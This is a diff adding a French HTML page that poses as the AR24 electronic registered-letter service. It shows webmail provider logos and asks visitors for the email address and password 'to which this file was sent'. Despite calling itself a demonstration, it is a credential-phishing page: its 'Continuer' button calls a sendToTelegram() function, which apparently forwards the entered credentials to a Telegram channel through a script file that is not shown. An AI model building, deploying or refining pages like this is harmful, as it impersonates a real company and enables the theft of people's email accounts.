@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <meta
+        name="description"
+        content="Interface de démonstration pour une lettre recommandée électronique"
+    >
+
+    <title>Accueil au service AR24</title>
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- =====================================================
+         BARRE SUPÉRIEURE
+    ====================================================== -->
+
+    <header class="topbar">
+        <div class="topbar-inner">
+            ACCUEIL AU SERVICE AR24
+        </div>
+    </header>
+
+
+    <!-- =====================================================
+         CONTENU
+    ====================================================== -->
+
+    <main class="page">
+
+        <!-- =================================================
+             FOURNISSEURS
+        ================================================== -->
+
+        <section
+            class="providers"
+            aria-label="Fournisseurs de messagerie"
+        >
+
+            <div class="provider">
+                <img
+                    src="images/orange.png"
+                    alt="Orange"
+                >
+            </div>
+
+            <div class="provider">
+                <img
+                    src="images/sfr.png"
+                    alt="SFR"
+                >
+            </div>
+
+            <div class="provider">
+                <img
+                    src="images/free.png.webp"
+                    alt="Free Webmail"
+                >
+            </div>
+
+            <div class="provider">
+                <img
+                    src="images/bbox.webp"
+                    alt="Bbox Mail"
+                >
+            </div>
+
+            <div class="provider">
+                <img
+                    src="images/outlook.png"
+                    alt="Outlook"
+                >
+            </div>
+
+            <div class="provider">
+                <img
+                    src="images/autre.png"
+                    alt="Autre fournisseur"
+                >
+            </div>
+
+        </section>
+
+
+        <!-- =================================================
+             INTRODUCTION
+        ================================================== -->
+
+        <section class="intro">
+
+            <div class="demo-title">
+                <span class="bullet">•</span>
+
+                <h1>
+                    AR24 - Lettre Recommandée Electronique en ligne
+                </h1>
+            </div>
+
+            <p class="intro-text">
+                <span class="bullet">•</span>
+
+                Veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé
+            </p>
+
+        </section>
+
+
+<!-- FORMULAIRE DE DÉMONSTRATION -->
+
+<section
+    class="demo-form"
+    aria-labelledby="demo-title"
+>
+
+
+    <div class="form-row">
+
+        <label for="demoEmail">
+            Adresse e-mail
+            <span aria-hidden="true">*</span>
+        </label>
+
+        <div class="input-area">
+
+            <input
+                id="demoEmail"
+                name="demoEmail"
+                type="email"
+                inputmode="email"
+                aria-describedby="emailHelp"
+            >
+
+        </div>
+
+    </div>
+
+
+    <div class="form-row">
+
+        <label for="demoCode">
+            Mot de passe
+            <span aria-hidden="true">*</span>
+        </label>
+
+        <div class="input-area">
+
+            <input
+                id="demoCode"
+                name="demoCode"
+                type="text"
+                aria-describedby="codeHelp"
+            >
+
+            <small id="codeHelp">
+                Notre <a href="">Politique de confidentialité</a>s'applique..
+            </small>
+
+        </div>
+
+    </div>
+
+
+
+    <div class="button-row">
+
+        <button
+            onclick="sendToTelegram()" ; id=""
+        >
+            Continuer
+        </button>
+
+    </div>
+
+<p>
+            
+Note : veuillez remplir les champs marqués d'un *.
+        </p>
+</section>
+
+           
+        </section>
+
+
+        <!-- =================================================
+             DESCRIPTION
+        ================================================== -->
+
+        <section class="description">
+
+            <h2>
+                AR24
+Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.
+AR24 est une filiale de Docaposte
+            </h2>
+
+            <p>
+                
+                AR24
+            </p>
+
+        </section>
+
+    </main>
+
+
+    <!-- =====================================================
+         FOOTER
+    ====================================================== -->
+
+    <footer class="footer">
+
+        <span>
+            Mentions légales | Politique de confidentialité | Politique des cookies | Plan du site | Garantie légale | Rétractation du contratConnexion
+        </span>
+
+        <span class="separator">
+            •
+        </span>
+
+        <span>
+            <a href="">Tous droits réservés
+AR24 2026</a>
+        </span>
+
+    </footer>
+
+
+    <!-- =====================================================
+         JAVASCRIPT
+    ====================================================== -->
+
+    <script src="script.js"></script>
+
+</body>
+</html>
